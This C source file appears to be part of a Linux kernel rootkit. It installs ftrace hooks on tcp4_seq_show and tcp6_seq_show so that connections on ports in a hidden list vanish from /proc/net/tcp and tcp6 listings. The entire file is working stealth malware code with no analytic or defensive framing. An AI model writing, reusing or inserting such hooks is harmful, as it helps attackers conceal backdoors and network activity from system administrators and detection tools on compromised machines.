#include "../include_hooks/tcp_seq_show.h"
#include "../include/core.h"

LIST_HEAD(hidden_ports_list);
DEFINE_SPINLOCK(hidden_ports_lock);

static asmlinkage int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);

static asmlinkage int hook_tcp4_seq_show(struct seq_file *seq, void *v) {
    if (v == SEQ_START_TOKEN)
        return orig_tcp4_seq_show(seq, v);
    struct sock *socket = v;

    struct hidden_ports *pos;
    spin_lock(&hidden_ports_lock);

    list_for_each_entry(pos, &hidden_ports_list, list) {
        if (pos->port == socket->sk_num) {
            spin_unlock(&hidden_ports_lock);
            return 0;
        }
    }

    spin_unlock(&hidden_ports_lock);

    return orig_tcp4_seq_show(seq, v);
}

static asmlinkage int hook_tcp6_seq_show(struct seq_file *seq, void *v) {
    if (v == SEQ_START_TOKEN)
        return orig_tcp6_seq_show(seq, v);
    struct sock *socket = v;

    struct hidden_ports *pos;
    spin_lock(&hidden_ports_lock);

    list_for_each_entry(pos, &hidden_ports_list, list) {
        if (pos->port == socket->sk_num) {
            spin_unlock(&hidden_ports_lock);
            return 0;
        }
    }

    spin_unlock(&hidden_ports_lock);

    return orig_tcp6_seq_show(seq, v);
}

static struct ftrace_hook tcp4_hooks[] = {
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show)

};

static struct ftrace_hook tcp6_hooks[] = {
    HOOK("tcp6_seq_show", hook_tcp6_seq_show, &orig_tcp6_seq_show)

};

int init_hook_tcp4_seq_show(void) {
    int err = fh_install_hooks(tcp4_hooks, ARRAY_SIZE(tcp4_hooks));
    if (err) {
        return err;
    }

    return 0;
}

int init_hook_tcp6_seq_show(void) {
    int err = fh_install_hooks(tcp6_hooks, ARRAY_SIZE(tcp6_hooks));
    if (err) {
        return err;
    }

    return 0;
}

void exit_hook_tcp4_seq_show(void) {
    fh_remove_hooks(tcp4_hooks, ARRAY_SIZE(tcp4_hooks));
}

void exit_hook_tcp6_seq_show(void) {
    fh_remove_hooks(tcp6_hooks, ARRAY_SIZE(tcp6_hooks));
}
